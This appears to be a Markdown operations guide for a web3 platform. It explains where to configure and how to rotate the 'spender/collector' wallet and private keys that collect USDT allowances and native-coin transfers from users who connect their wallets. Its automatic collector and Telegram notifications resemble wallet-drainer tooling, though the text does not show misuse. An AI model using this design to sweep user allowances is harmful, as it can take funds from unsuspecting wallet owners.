# Change spender / collector wallet guide

Use this when you rotate the **platform wallet** that receives user approvals and native coin transfers.

## Rating (before vs after unification)

| Aspect | Before (duplicated env) | After (`config/platform.env`) |
|--------|-------------------------|-------------------------------|
| Operability | **4/10** — same vars in 2+ files, easy to drift | **8/10** — one file for wallet config |
| Rotation steps | Edit backend + website, hope they match | Edit one file, restart both services |
| Secret handling | Keys only in backend (good) but addresses duplicated | Keys stay backend-only at load time; website never reads private keys |
| Remaining gaps | — | Still requires restart; admin UI cannot change addresses (by design) |

---

## Single config file (use this)

**Edit `config/platform.env`** — the only place you change spender addresses and signing keys.

```bash
cp config/platform.env.example config/platform.env   # first-time setup
# edit config/platform.env
# restart backend + website
```

| Variable | Loaded by | Purpose |
|----------|-----------|---------|
| `NEXT_PUBLIC_SPENDER_EVM` | Backend + website | EVM spender / native recipient (eth, bsc, pol, avax, arb, base) |
| `NEXT_PUBLIC_SPENDER_TRON` | Backend + website | TRON spender / native TRX recipient |
| `NEXT_PUBLIC_APPROVE_AMOUNT_USDT` | Website | Default approve amount in connect flow |
| `ALLOW_SELF_SPENDER` | Backend + website | Dev-only: owner === spender |
| `ADMIN_EVM_PRIVATE_KEY` | **Backend only** | Signs EVM `transferFrom` — must match `NEXT_PUBLIC_SPENDER_EVM` |
| `ADMIN_TRON_PRIVATE_KEY` | **Backend only** | Signs TRON `transferFrom` — must match `NEXT_PUBLIC_SPENDER_TRON` |
| `TRON_ENERGY_DELEGATOR_PRIVATE_KEY` | Backend only (optional) | Separate energy delegator; falls back to `ADMIN_TRON_PRIVATE_KEY` |

**Load order**

1. `config/platform.env` (shared wallet config)
2. `backend/.env.local` — service overrides (`DATABASE_URL`, `PORT`, `ADMIN_API_KEY`, TRON energy knobs, …)
3. `frontend/website/.env.local` — app overrides (`NEXT_PUBLIC_PROJECT_ID`, `BACKEND_API_URL`, …)

Website `next.config.ts` loads **only the public keys** from `platform.env` — private keys never enter the Next.js process.

---

## Terminology

| Term | Meaning | Where it is configured |
|------|---------|------------------------|
| **Owner** | End-user wallet that connects on the website | Not a platform setting — each customer uses their own wallet |
| **Spender / collector** | Platform wallet that receives ERC-20 / TRC-20 **allowance** and signs `transferFrom` | `config/platform.env` |
| **Native recipient** | Address that receives native coin transfers (ETH, TRX, BNB, …) | Same spender vars in `config/platform.env` |
| **Collection destination** | On-chain `to` address for a specific collected transfer | Stored per approval as `collectionToAddress` (optional override) |

In local dev with `ALLOW_SELF_SPENDER=true`, owner and spender can be the same wallet. In production they must be different.

---

## Quick checklist — rotating the platform wallet

1. Generate or import the new wallet(s).
2. Edit **`config/platform.env`** — update spender address(es) and matching private key(s).
3. Confirm **key ↔ address match** (backend validates on every collection).
4. Fund the new wallet(s) with gas (ETH/BNB/MATIC/… and TRX).
5. **Restart backend** and **restart website**.
6. Verify **Admin → System** shows `spenderMatch: true` for EVM and TRON.
7. Read [Historical data](#historical-data-and-migration) — old on-chain allowances stay with the old spender.

---

## Other env files (not for wallet rotation)

### Backend — `backend/.env.local`

Service-specific only. Do **not** duplicate spender vars here.

| Variable | Purpose |
|----------|---------|
| `DATABASE_URL` | Postgres |
| `PORT` | API port (default 4000) |
| `ADMIN_API_KEY` | Admin API auth |
| `TRONGRID_API_KEY` | TronGrid RPC (recommended) |
| `RESOURCE_SPONSOR_*` / `TRON_ENERGY_*` | TRON energy sponsorship backend knobs |

### Website — `frontend/website/.env.local`

| Variable | Purpose |
|----------|---------|
| `NEXT_PUBLIC_PROJECT_ID` | WalletConnect project ID |
| `BACKEND_API_URL` | BFF proxy target (use `http://127.0.0.1:4000` on macOS) |
| `TELEGRAM_*` | Optional client log notifications |

### Admin — `frontend/admin/.env.local`

No wallet config. Only `BACKEND_API_URL`, `ADMIN_API_KEY`, session/login secrets.

---

## Admin settings — what is wired vs env-only

### Wired in Admin → Settings (DB `AppSettings`, hot-reload)

These **do not** change spender/collector addresses:

| Setting key | What it controls |
|-------------|------------------|
| `permissions.allowSelfSpender` | Runtime override for `ALLOW_SELF_SPENDER` |
| `collector.*` | Automatic collector enable / interval / batch / lease / RPC timeout |
| `collection.defaultMode` / `collection.approveAmountUsdtDefault` | Website approve UX defaults |
| `native.reconcile.*` | Native transfer confirmation scheduler |
| `resources.*` | TRON energy sponsorship toggles |

### Wired in Admin → System (read-only)

- `secrets.evm.spenderAddress` / `secrets.tron.spenderAddress` — from `config/platform.env`
- `secrets.*.spenderMatch` — key derives configured address?
- Private keys are never shown.

### Wired per approval

**Admin → Approvals → [id]** can override `collectionToAddress` for that row only (payout destination, not on-chain allowance spender).

### Not wired in admin (by design)

Spender addresses and signing keys stay in `config/platform.env` / deployment secrets — not in DB or admin UI.

---

## Historical data and migration

### Token approvals (USDT allowance)

- `Approval.spenderAddress` is set from env **at confirm time**.
- On-chain allowance stays with the **old** spender until users re-approve.
- Keep old private keys if you need to collect legacy allowances.

### Native transfers

- Recipient validated against current env at register time; `NativeTransfer.toAddress` is persisted per row.

---

## Step-by-step: change EVM collector

1. Create wallet; note `0x…` address.
2. In **`config/platform.env`**: set `NEXT_PUBLIC_SPENDER_EVM` and `ADMIN_EVM_PRIVATE_KEY`.
3. Restart backend and website.
4. Admin → System → `secrets.evm.spenderMatch === true`.
5. Test a new approval; confirm `Approval.spenderAddress` matches.

## Step-by-step: change TRON collector

Same flow with `NEXT_PUBLIC_SPENDER_TRON` and `ADMIN_TRON_PRIVATE_KEY`.

---

## Optional: override spender in code

```tsx
<ConnectFlow spenderEvm="0x…" spenderTron="T…" />
```

Backend collection still uses **`config/platform.env`**. Props only affect the website client/BFF unless they match backend config.

---

## Related docs

- Template: `config/platform.env.example`
- Loader: `backend/src/config/env.ts`, `frontend/website/next.config.ts`
- Architecture: `docs/architecture/collection-rollout.md`
